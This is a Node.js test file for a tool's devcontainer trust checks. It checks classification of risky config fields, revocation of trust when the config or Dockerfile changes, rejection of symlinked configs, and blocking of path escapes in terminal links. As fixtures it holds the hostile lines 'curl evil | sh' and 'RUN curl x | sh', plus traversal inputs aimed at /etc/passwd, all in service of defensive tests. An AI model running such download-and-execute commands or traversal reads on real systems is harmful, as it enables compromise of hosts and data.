import assert from "node:assert/strict";
import { test } from "node:test";
import { mkdtemp, mkdir, writeFile, symlink } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { classifyDevcontainer } from "../core/modules/devcontainer/index.ts";
import {
  decideDevcontainer,
  devcontainerLaunch,
  devcontainerState,
} from "../server/modules/devcontainer/index.ts";

const ids = (config) => classifyDevcontainer(config).map((finding) => finding.id);

await test("only elevated capabilities need a trust decision", () => {
  assert.deepEqual(
    ids({ image: "node:24", forwardPorts: [3000], containerEnv: { A: "1" }, remoteUser: "node" }),
    [],
  );
  assert.deepEqual(ids({ initializeCommand: "make host", features: { "ghcr.io/x/y:1": {} } }), [
    "initialize-command",
    "features",
  ]);
  assert.deepEqual(
    ids({ build: { dockerfile: "Dockerfile" }, runArgs: ["--privileged"], mounts: ["a"] }).sort(),
    ["build", "mounts", "run-args"],
  );
  assert.deepEqual(ids({ postCreateCommand: ["npm", "i"], remoteUser: "root" }), [
    "lifecycle",
    "root-user",
  ]);
  assert.deepEqual(ids({ privileged: false, capAdd: [], mounts: [] }), []);
  assert.deepEqual(ids(null), []);
});

async function fixture(config) {
  const root = await mkdtemp(join(tmpdir(), "projector-devcontainer-"));
  process.env.XDG_DATA_HOME = join(root, "data");
  const path = join(root, "repo");
  await mkdir(join(path, ".devcontainer"), { recursive: true });
  await writeFile(join(path, ".devcontainer", "devcontainer.json"), config);
  return { root, path, project: { id: "p", name: "repo", path } };
}
const JSONC = `{
  // JSONC: comments and trailing commas are valid here
  "name": "demo",
  "image": "node:24-bookworm",
  "initializeCommand": "echo host",
}`;

await test("trust is bound to the exact configuration and falls back when it changes", async () => {
  const { path, project } = await fixture(JSONC);
  let state = devcontainerState(project);
  assert.equal(state.found, true);
  assert.equal(state.name, "demo");
  assert.equal(state.needsDecision, true);
  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);

  await assert.rejects(decideDevcontainer(project, "trusted", "not-the-shown-hash"), /изменилась/);
  state = await decideDevcontainer(project, "trusted", state.hash);
  assert.equal(state.decision, "trusted");
  assert.equal(state.needsDecision, false);
  const launch = devcontainerLaunch(project, ["/bin/bash", "-i", "-c", "echo 'q'"]);
  assert.equal(launch.file, "/bin/sh");
  assert.deepEqual(launch.args.slice(-4), ["/bin/bash", "-i", "-c", "echo 'q'"]);
  assert.match(launch.args[1], /\bup\b[\s\S]*\bexec\b/);

  // Editing the config after the decision revokes it until the user decides again.
  await writeFile(
    join(path, ".devcontainer", "devcontainer.json"),
    JSONC.replace("echo host", "curl evil | sh"),
  );
  state = devcontainerState(project);
  assert.equal(state.stale, true);
  assert.equal(state.decision, null);
  assert.equal(state.needsDecision, true);
  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);

  state = await decideDevcontainer(project, "declined", state.hash);
  assert.equal(state.decision, "declined");
  assert.equal(state.needsDecision, false);
  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);

  state = await decideDevcontainer(project, "forget");
  assert.equal(state.decision, null);
});

await test("a changed Dockerfile also invalidates trust", async () => {
  const { path, project } = await fixture(JSON.stringify({ build: { dockerfile: "Dockerfile" } }));
  await writeFile(join(path, ".devcontainer", "Dockerfile"), "FROM node:24\n");
  const first = devcontainerState(project);
  await decideDevcontainer(project, "trusted", first.hash);
  assert.ok(devcontainerLaunch(project, ["bash"]));
  await writeFile(join(path, ".devcontainer", "Dockerfile"), "FROM node:24\nRUN curl x | sh\n");
  assert.equal(devcontainerState(project).decision, null);
  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);
});

await test("a config symlinked out of the project is ignored", async () => {
  const { root, path } = await fixture("{}");
  const other = join(root, "outside.json");
  await writeFile(other, JSON.stringify({ initializeCommand: "x" }));
  const linked = join(root, "linked");
  await mkdir(linked);
  await symlink(other, join(linked, ".devcontainer.json"));
  assert.equal(devcontainerState({ id: "l", name: "l", path: linked }).found, false);
  assert.equal(devcontainerState({ id: "p", name: "p", path }).found, true);
});

await test("projects without a config have nothing to decide", async () => {
  const root = await mkdtemp(join(tmpdir(), "projector-devcontainer-"));
  const state = devcontainerState({ id: "n", name: "n", path: root });
  assert.equal(state.found, false);
  assert.equal(state.needsDecision, false);
  await assert.rejects(
    decideDevcontainer({ id: "n", name: "n", path: root }, "trusted", "x"),
    /нет devcontainer/,
  );
});

const { containerToHost } = await import("../server/modules/terminal/link-files.ts");
await test("terminal links map container paths into the project and refuse escapes", () => {
  const map = (path) => containerToHost(path, "/workspaces/app", "/home/me/app");
  assert.equal(map("/workspaces/app/src/a.ts"), "/home/me/app/src/a.ts");
  assert.equal(map("src/a.ts"), "/home/me/app/src/a.ts");
  assert.equal(map("/workspaces/app"), "/home/me/app");
  assert.throws(() => map("/etc/passwd"), /вне проекта/);
  assert.throws(() => map("~/x"), /вне проекта/);
  assert.throws(() => map("/workspaces/app/../../etc/passwd"), /за пределы/);
  assert.throws(() => map("../secret"), /за пределы/);
  assert.throws(() => map("/workspaces/application/x"), /вне проекта/);
});
